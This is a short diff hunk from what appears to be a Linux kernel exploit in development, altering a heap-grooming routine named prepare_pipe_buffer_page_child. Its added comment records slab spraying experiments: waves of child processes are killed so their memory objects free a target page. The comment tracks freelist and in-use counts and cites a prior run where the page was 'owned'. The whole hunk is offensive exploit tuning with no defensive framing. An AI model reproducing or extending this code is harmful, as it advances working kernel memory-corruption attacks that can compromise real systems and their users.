@@ -448,7 +448,19 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     errno = tn_errno;
     pr_info("child conv fd=%d set=%d errno=%d\n", conv_fd, tr, errno);
   }
-  enum { CONVERT_MAX_WAVES = 24, CONVERT_HOLD_WAVES = 6 };
+  /* CONVERT_HOLD_WAVES=1 (per-wave kill): the batch-6 mode is a
+   * structural failure per the five-word forensics -- after
+   * batch kill sent=660 reaped=660 werr=0 the target page's
+   * +20 freelist stays NULL and inuse stays 34 for all 24 waves
+   * (the 34 objects are never freed, so the discard wave never
+   * happens).  The 771b7409 success (waves=2 taken=1 owned=1) ran
+   * the per-wave mode.  Per-wave also doubles as the decisive
+   * experiment: the w=1 wavehead read right after kill(wave[0])
+   * shows whether wave[0]'s mms actually live on the target page
+   * (freelist moves / inuse drops / tsc==0 => yes and the free
+   * path works; page frozen at inuse=34 => the fillers are NOT
+   * wave mms). */
+  enum { CONVERT_MAX_WAVES = 24, CONVERT_HOLD_WAVES = 1 };
   size_t wave_sz = 3 * objs_per_slab + 8;
   pid_t *wave_pids = calloc(CONVERT_MAX_WAVES * wave_sz, sizeof(pid_t));
   int waves_used = 0;
